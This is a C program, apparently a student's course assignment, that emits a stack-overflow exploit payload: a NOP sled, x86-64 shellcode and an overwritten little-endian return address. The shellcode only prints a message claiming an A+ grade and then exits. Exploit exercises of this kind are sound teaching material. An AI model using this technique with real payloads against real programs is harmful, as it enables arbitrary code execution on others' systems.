/* Noah French (njf5cu) */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include "buffer_addr.h"


int  main () {

  // NOP sled + shellcode size (in bytes) should = 216.
  // NOP sled
  for (int i = 0; i < 61; i++) {
    fputs("\x90", stdout);
  }

  unsigned char *shellcode = "\xeb\x34\x4e\x6f\x61\x68\x20\x46\x72\x65\x6e\x63\x68\x2c\x20\x79\x6f\x75\x72\x20\x67\x72\x61\x64\x65\x20\x6f\x6e\x20\x74\x68\x69\x73\x20\x61\x73\x73\x69\x67\x6e\x6d\x65\x6e\x74\x20\x69\x73\x20\x61\x6e\x20\x41\x2b\x6e\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x4d\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\xb0\x01\x89\xc7\x48\x8d\x35\xaf\xff\xff\xff\x48\x31\xd2\xb2\x33\x0f\x05\x48\x31\xc0\xb0\x2a\x2c\x20\x88\x05\xce\xff\xff\xff\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\xb0\x01\x89\xc7\x48\x8d\x35\xba\xff\xff\xff\x48\x31\xd2\xb2\x01\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x0f\x05";

  //printf("%ld", strlen(shellcode));


  // Put buffer adderss in Little Endian
  
  //GDB buffer address
  // unsigned char *address = "\xf0\xdd\xff\xff\xff\x7f";
  
  //Normal buffer address

  fputs(shellcode, stdout);
  
  unsigned char address[] = BUFFER_ADDR_ARRAY;
  for (int i = 0; i < 6; i++) {
    printf("%c", address[i]);
  }
  
  return 0;
}
